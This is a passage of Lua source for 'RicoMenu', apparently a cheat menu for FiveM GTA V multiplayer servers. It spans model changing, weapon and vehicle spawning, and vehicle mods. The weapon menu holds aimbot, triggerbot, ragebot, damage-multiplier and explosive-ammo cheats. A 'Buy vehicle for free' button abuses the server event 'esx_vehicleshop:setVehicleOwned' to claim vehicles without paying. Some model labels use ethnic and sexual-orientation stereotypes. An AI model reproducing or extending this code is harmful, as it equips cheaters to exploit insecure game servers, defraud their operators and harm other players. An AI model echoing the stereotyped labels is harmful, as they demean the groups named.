				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~b~Arabic 🐪") then
			local model = "u_m_m_partytarget"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~y~Super Hero 🦸‍") then
			local model = "u_m_y_imporage"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~b~Gay 🏳‍🌈") then
			local model = "a_m_m_acult_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~g~Terrorist 💣") then
			local model = "mp_m_bogdangoon"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~p~FIB 👮") then
			local model = "s_m_m_fibsec_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~b~Gangster 🎩") then
			local model = "s_m_y_dealer_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~r~Gangster2 🎩") then
			local model = "ig_jimmyboston_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~o~Paramedic 👨‍⚕️") then
			local model = "S_M_M_Paramedic_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
			elseif RicoMenu.Button("Change To ~r~Stripper 💄") then
			local model = "s_f_y_stripper_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif RicoMenu.Button("Change To ~b~Cop 👨🏽‍") then
			local model = "s_m_y_cop_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif RicoMenu.Button("Change To ~o~Rich Old Man 🧔🏽") then
			local model = "U_M_O_TapHillBilly"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif RicoMenu.Button("Change To ~y~Old Man 👨🏾‍🦳") then
			local model = "s_m_o_busker_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif RicoMenu.Button("Change To ~g~Alien 👽") then
			local model = "s_m_m_movalien_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif RicoMenu.Button("Change To ~p~Pongo 🐾") then
			local model = "u_m_y_pogo_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif RicoMenu.Button("Change To ~r~Body Builder 01 M 🏋️") then
			local model = "A_M_Y_MusclBeac_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif RicoMenu.Button("Change To ~g~Body Builder 02 M 🏋️") then
			local model = "A_M_Y_MusclBeac_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif RicoMenu.Button("Change To ~p~Body Builder 03 M 🏋️") then
			local model = "a_m_y_beach_03"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif RicoMenu.Button("Change To ~o~Model Jew ✡︎") then
			local model = "a_m_m_hasjew_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif RicoMenu.Button("Change To ~r~Model Chinese 👲🏻") then
			local model = "G_M_M_ChiGoon_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif RicoMenu.Button("Change To ~g~Model Black OPS 🎮") then
			local model = "S_M_Y_BlackOps_03"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif RicoMenu.Button("Change To ~p~Model Gang Boss 🤵🏻") then
			local model = "G_M_Y_BallaOrig_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif RicoMenu.Button("Change To ~o~Babyd 🏋️") then
			local model = "u_m_y_babyd"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			end
                
                -- Head Menu
                elseif RicoMenu.IsMenuOpened('modifyhead') then
                    if RicoMenu.ComboBoxSlider("Face", faceItemsList, currFaceIndex, selFaceIndex, function(currentIndex, selectedIndex)
                        currFaceIndex = currentIndex
                        selFaceIndex = currentIndex 
                        SetPedComponentVariation(PlayerPedId(), 0, faceItemsList[currentIndex]-1, 0, 0)
						faceTexturesList = GetHeadTextures(faceItemsList[currentIndex]-1)
						end) then
                    elseif RicoMenu.ComboBoxSlider("Hair", hairItemsList, currHairIndex, selHairIndex, function(currentIndex, selectedIndex)
                        previousHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
                        
                        previousHairTextureDisplay = hairTextureList[currHairTextureIndex]

                        currHairIndex = currentIndex
                        selHairIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currentIndex]-1, 0, 0)
                        currentHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
                        hairTextureList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))

                        if (currentKey == keys.left or currentKey == keys.right) and previousHairTexture > currentHairTexture and previousHairTextureDisplay > currentHairTexture then
                            currHairTextureIndex = hairTexturesList[currentHairTexture]
                            selHairTextureIndex = hairTexturesList[currentHairTexture]
                        end

                        end) then
                    elseif RicoMenu.ComboBox2("Hair Color", hairTextureList, currHairTextureIndex, selHairTextureIndex, function(currentIndex, selectedIndex)
                        currHairTextureIndex = currentIndex
                        selHairTextureIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currHairIndex]-1, currentIndex-1, 0)
                        end) then
                    elseif RicoMenu.ComboBoxSlider("Mask", maskItemsList, currMaskIndex, selMaskIndex, function(currentIndex, selectedIndex)
                        currMaskIndex = currentIndex
                        selMaskIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 1, maskItemsList[currentIndex]-1, 0, 0)
						end) then
                    elseif RicoMenu.ComboBoxSlider("Hat", hatItemsList, currHatIndex, selHatIndex, function(currentIndex, selectedIndex)
                        previousHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) -- Gets the number of props before the hat index and the prop updates (previous)

                        -- I wanted to grab hatTexturesList[currHatTextureIndex] before the the Prop was updated. This value is the number (index) that is shown on the Hat Texture ComboBox before it updates
                        previousHatTextureDisplay = hatTexturesList[currHatTextureIndex]

                        -- Both Hat Slider and Hat Texture ComboBox values update
                        currHatIndex = currentIndex
                        selHatIndex = currentIndex
                        SetPedPropIndex(PlayerPedId(), 0, hatItemsList[currentIndex]-1, 0, 0)
                        currentHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) -- Gets the number of props after the hat index and the prop updates (current)
                        hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0)) -- Generates our array of indexes

                        -- This if condition will only run once for every hat change since the variables previousHatTexture and currentHatTexture will become the same after the SetPedPropIndex() function runs
                        if (currentKey == keys.left or currentKey == keys.right) and previousHatTexture > currentHatTexture and previousHatTextureDisplay > currentHatTexture then 
                            print('if condition')
                            -- Checking if the left/right arrow key was pressed since this function runs every tick, to make sure it really only runs once
                            
                            -- Sets the current Index of the HatTexturesList to the max value of the currentHatTexture
                            currHatTextureIndex = hatTexturesList[currentHatTexture]
                            selHatTextureIndex = hatTexturesList[currentHatTexture]
                        end

						end) then	
					elseif RicoMenu.ComboBox2("Hat Texture", hatTexturesList, currHatTextureIndex, selHatTextureIndex, function(currentIndex, selectedIndex)
                        currHatTextureIndex = currentIndex
                        selHatTextureIndex = currentIndex
                        SetPedPropIndex(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0), currentIndex, 0)
						end) then
						
                    end
					
					
				elseif RicoMenu.IsMenuOpened('WeaponCustomization') then
                    if RicoMenu.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
                    currPFuncIndex = currentIndex
                    selPFuncIndex = currentIndex
					  end) then
                    if selPFuncIndex == 1 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
                 
                    elseif selPFuncIndex == 2 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
                    
                    elseif selPFuncIndex == 3 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
                    
                    elseif selPFuncIndex == 4 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
                    
                    elseif selPFuncIndex == 5 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
                    
                    elseif selPFuncIndex == 6 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
                    
                    elseif selPFuncIndex == 7 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
                    
                    elseif selPFuncIndex == 8 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
                    end
                elseif RicoMenu.Button("~g~Add ~s~Special Finish") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif RicoMenu.Button("~r~Remove ~s~Special Finish") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif RicoMenu.Button("~g~Add ~s~Suppressor") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif RicoMenu.Button("~r~Remove ~s~Suppressor") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif RicoMenu.Button("~g~Add ~s~Scope") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                elseif RicoMenu.Button("~r~Remove ~s~Scope") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                end
			

        -- WEAPON OPTIONS MENU
        elseif RicoMenu.IsMenuOpened('weapon') then
            if RicoMenu.MenuButton("~b~Give ~s~Single Weapon ~g~[MOST SERVERS]", 'weaponspawner') then
                selectedPlayer = PlayerId()
			elseif RicoMenu.MenuButton("Weapon Customization", "WeaponCustomization") then
                selectedPlayer = PlayerId()
            elseif RicoMenu.Button("Give All Weapons") then
                GiveAllWeapons(PlayerId())
            elseif RicoMenu.Button("Remove All Weapons") then
                StripPlayer(PlayerId())
			elseif RicoMenu.Button("Remove Ammo") then
                SetPedAmmo(GetPlayerPed(-1), 0)
            elseif RicoMenu.Button("Give Max Ammo") then
                GiveMaxAmmo(PlayerId())
            elseif RicoMenu.CheckBox("Infinite Ammo", InfAmmo) then
                InfAmmo = not InfAmmo
                SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
            elseif RicoMenu.CheckBox("Explosive Ammo", ExplosiveAmmo) then
                ExplosiveAmmo = not ExplosiveAmmo
            elseif RicoMenu.CheckBox("Force Gun", ForceGun) then
                ForceGun = not ForceGun
            elseif RicoMenu.CheckBox("Super Damage", SuperDamage) then
                SuperDamage = not SuperDamage
                if SuperDamage then
                    local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
                    SetPlayerWeaponDamageModifier(PlayerId(), 200.0)
                else
                    local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
                    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                end
            elseif RicoMenu.CheckBox("Rapid Fire", RapidFire) then
                RapidFire = not RapidFire
            elseif RicoMenu.CheckBox("Aimbot", Aimbot) then
                Aimbot = not Aimbot
            elseif RicoMenu.ComboBox("Aimbot Bone Target ~y~»", AimbotBoneOps, currAimbotBoneIndex, selAimbotBoneIndex, function(currentIndex, selectedIndex)
                currAimbotBoneIndex = currentIndex
                selAimbotBoneIndex = currentIndex
                AimbotBone = NameToBone(AimbotBoneOps[currentIndex])
            end) then
                elseif RicoMenu.CheckBox("Draw Aimbot FOV", DrawFov) then
                DrawFov = not DrawFov
                elseif RicoMenu.CheckBox("Triggerbot", Triggerbot) then
                    Triggerbot = not Triggerbot
                elseif RicoMenu.CheckBox("~u~Ragebot", Ragebot) then
                    Ragebot = not Ragebot
                end
        
        
        -- SPECIFIC WEAPON MENU
        elseif RicoMenu.IsMenuOpened('weaponspawner') then
            if RicoMenu.MenuButton('Melee Weapons', 'melee') then
            elseif RicoMenu.MenuButton('Pistols', 'pistol') then
            elseif RicoMenu.MenuButton('SMGs / MGs', 'smg') then
            elseif RicoMenu.MenuButton('Shotguns', 'shotgun') then
            elseif RicoMenu.MenuButton('Assault Rifles', 'assault') then
            elseif RicoMenu.MenuButton('Sniper Rifles', 'sniper') then
            elseif RicoMenu.MenuButton('Thrown Weapons', 'thrown') then
            elseif RicoMenu.MenuButton('Heavy Weapons', 'heavy') then
			end
        
        -- MELEE WEAPON MENU
        elseif RicoMenu.IsMenuOpened('melee') then
            for i = 1, #meleeweapons do
                if RicoMenu.Button("~r~» ~s~"..meleeweapons[i][2].."") then
                    weapon = GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("weapon_switchblade"), 1000, false, true)
                end
            end
        -- PISTOL MENU
        elseif RicoMenu.IsMenuOpened('pistol') then
			for i = 1, #pistolweapons do
                if RicoMenu.Button("~r~» ~s~"..pistolweapons[i][2].."") then
                    weapon = GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("weapon_pistol"), 1000, false, true)
				elseif RicoMenu.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(pistolweapons[i][1]), 0)
                end
            end
        -- SMG MENU
        elseif RicoMenu.IsMenuOpened('smg') then
            for i = 1, #smgweapons do
                if RicoMenu.Button("~r~» ~s~"..smgweapons[i][2].."") then
                    weapon = GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("weapon_smg"), 1000, false, true)
				elseif RicoMenu.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(smgweapons[i][1]), 0)
                end
            end
        -- SHOTGUN MENU
        elseif RicoMenu.IsMenuOpened('shotgun') then
            for i = 1, #shotgunweapons do
                if RicoMenu.Button("~r~» ~s~"..shotgunweapons[i][2].."") then
                    weapon = GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("weapon_shotgun"), 1000, false, true)
					elseif RicoMenu.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(shotgunweapons[i][1]), 0)
                end
            end
        -- ASSAULT RIFLE MENU
        elseif RicoMenu.IsMenuOpened('assault') then
            for i = 1, #assaultweapons do
                if RicoMenu.Button("~r~» ~s~"..assaultweapons[i][2].."") then
                    weapon = GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("weapon_assaultrifle"), 1000, false, true)
					elseif RicoMenu.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(assaultweapons[i][1]), 0)
                end
            end
        -- SNIPER MENU
        elseif RicoMenu.IsMenuOpened('sniper') then
            for i = 1, #sniperweapons do
                if RicoMenu.Button("~r~» ~s~"..sniperweapons[i][2].."") then
                    weapon = GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("weapon_sniperrifle"), 1000, false, true)
					elseif RicoMenu.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(sniperweapons[i][1]), 0)
                end
            end
        -- THROWN WEAPON MENU
        elseif RicoMenu.IsMenuOpened('thrown') then
            for i = 1, #thrownweapons do
                if RicoMenu.Button("~r~» ~s~"..thrownweapons[i][2].."") then
                    weapon = GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("weapon_grenade"), 1000, false, true)
					elseif RicoMenu.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(thrownweapons[i][1]), 0)
                end
            end
        -- HEAVY WEAPON MENU
        elseif RicoMenu.IsMenuOpened('heavy') then
            for i = 1, #heavyweapons do
                if RicoMenu.Button("~r~» ~s~"..heavyweapons[i][2].."") then
                    weapon = GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("weapon_rpg"), 1000, false, true)
					elseif RicoMenu.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(heavyweapons[i][1]), 0)
                end
            end
        
        
        -- VEHICLE OPTIONS MENU
        elseif RicoMenu.IsMenuOpened('vehicle') then
            if RicoMenu.MenuButton("🚘 Vehicle Spawner", 'vehiclespawner') then
                elseif RicoMenu.MenuButton("Vehicle Mods", 'vehiclemods') then
                elseif RicoMenu.MenuButton("Vehicle Control Menu", 'vehiclemenu') then
				elseif RicoMenu.MenuButton("Vehicle ~r~Boost", "VehBoostMenu") then
                elseif RicoMenu.MenuButton("Vehicle Godmode", VehGodmode) then
                    VehGodmode = not VehGodmode
				elseif RicoMenu.ComboBox("Vehicle Functions ~r~»", {"🔧 Repair Vehicle", "Clean Vehicle", "Dirty Vehicle"}, currVFuncIndex, selVFuncIndex, function(currentIndex, selClothingIndex)
                    currVFuncIndex = currentIndex
                    selVFuncIndex = currentIndex
                    end) then
					local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
					RequestControlOnce(veh)
					if selVFuncIndex == 1 then
						FixVeh(veh)
						SetVehicleEngineOn(veh, 1, 1)
					elseif selVFuncIndex == 2 then
						SetVehicleDirtLevel(veh, 0)
					elseif selVFuncIndex == 3 then
						SetVehicleDirtLevel(veh, 15.0)
					end
				elseif RicoMenu.Button("Drive to waypoint ~g~AUTO") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 2883621, 5.5, true)
                        SetDriveTaskDrivingStyle(ped, 2883621)
                        speedmit = true
                    end
				elseif RicoMenu.Button("~r~Stop ~s~Drive AUTO") then
                    speedmit = false
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ClearPedTasks(GetPlayerPed(-1))
                    else
                        ClearPedTasksImmediately(GetPlayerPed(-1))
				    end
			
				elseif RicoMenu.Button("Buy vehicle for free ~r~(risk)") then
				local cb = GetKeyboardInput('Enter Vehicle Spawn Name', '', 100)
				local cw = GetKeyboardInput('Enter Vehicle Licence Plate', '', 100)
				if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
				RequestModel(cb)
				while not HasModelLoaded(cb) do
				Citizen.Wait(0)
				end
				local veh =
				CreateVehicle(
				GetHashKey(cb),
				GetEntityCoords(PlayerPedId(-1)),
				GetEntityHeading(PlayerPedId(-1)),
				true,
				true
					)
					SetVehicleNumberPlateText(veh, cw)
					local cx = ESX.Game.GetVehicleProperties(veh)
					TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
					ShowInfo('~g~~h~Success', false)
				else
					ShowInfo('~b~~h~Model is not valid!', true)
    end
				elseif RicoMenu.CheckBox("Drift", driftMode) then
                    driftMode = not driftMode
                elseif RicoMenu.CheckBox("Collision", Collision) then
                    Collision = not Collision
                elseif RicoMenu.ComboBoxSlider("Speed Multiplier", SpeedModOps, currSpeedIndex, selSpeedIndex, function(currentIndex, selectedIndex)
                    currSpeedIndex = currentIndex
                    selSpeedIndex = currentIndex
                    SpeedModAmt = SpeedModOps[currSpeedIndex]
                    
                    if SpeedModAmt == 1.0 then
                        SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt)
                    else
                        SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt * 20.0)
                    end
                end) then
                    elseif RicoMenu.CheckBox("Easy Handling / Stick To Floor", EasyHandling) then
                    EasyHandling = not EasyHandling
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    if not EasyHandling then
                        SetVehicleGravityAmount(veh, 9.8)
                    else
                        SetVehicleGravityAmount(veh, 30.0)
                    end
                    elseif RicoMenu.CheckBox("Deadly Bulldozer", DeadlyBulldozer) then
                        DeadlyBulldozer = not DeadlyBulldozer
                        if DeadlyBulldozer then
                            local veh = SpawnVeh("BULLDOZER", 1, SpawnEngineOn)
                            SetVehicleCanBreak(veh, not DeadlyBulldozer)
                            SetVehicleCanBeVisiblyDamaged(veh, not DeadlyBulldozer)
                            SetVehicleEnginePowerMultiplier(veh, 2500.0)
                            SetVehicleEngineTorqueMultiplier(veh, 2500.0)
                            SetVehicleEngineOn(veh, 1, 1, 1)
                            SetVehicleGravityAmount(veh, 50.0)
                            SetVehicleColours(veh, 27, 27)
                            ShowInfo("~r~Go forth and devour thy enemies!\nPress ~w~E ~r~to launch a minion!")
                        elseif not DeadlyBulldozer and IsPedInModel(PlayerPedId(), GetHashKey("BULLDOZER")) then
                            DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
                        end
                    end
        
        -- VEHICLE SPAWNER MENU
        elseif RicoMenu.IsMenuOpened('vehiclespawner') then
            if RicoMenu.Button("Spawn Vehicle By Name") then
                local model = GetKeyboardInput("Enter Model Name:")
                SpawnVeh(model, PlaceSelf, SpawnEngineOn)
            elseif RicoMenu.CheckBox("Put Self Into Spawned Vehicle", PlaceSelf, "No", "Yes") then
                PlaceSelf = not PlaceSelf			
            elseif RicoMenu.CheckBox("Spawn Planes In Air", SpawnInAir, "No", "Yes") then
                SpawnInAir = not SpawnInAir
            elseif RicoMenu.CheckBox("Spawn Vehicle With Engine : ", SpawnEngineOn, "No", "Yes") then
                SpawnEngineOn = not SpawnEngineOn
            elseif RicoMenu.MenuButton('Compacts', 'compacts') then
            elseif RicoMenu.MenuButton('Sedans', 'sedans') then
            elseif RicoMenu.MenuButton('SUVs', 'suvs') then
            elseif RicoMenu.MenuButton('Coupes', 'coupes') then
            elseif RicoMenu.MenuButton('Muscle', 'muscle') then
            elseif RicoMenu.MenuButton('Sports Classics', 'sportsclassics') then
            elseif RicoMenu.MenuButton('Sports', 'sports') then
            elseif RicoMenu.MenuButton('Super', 'super') then
            elseif RicoMenu.MenuButton('Motorcycles', 'motorcycles') then
            elseif RicoMenu.MenuButton('Off-Road', 'offroad') then
            elseif RicoMenu.MenuButton('Industrial', 'industrial') then
            elseif RicoMenu.MenuButton('Utility', 'utility') then
            elseif RicoMenu.MenuButton('Vans', 'vans') then
			elseif RicoMenu.MenuButton('Cycles', 'cycles') then
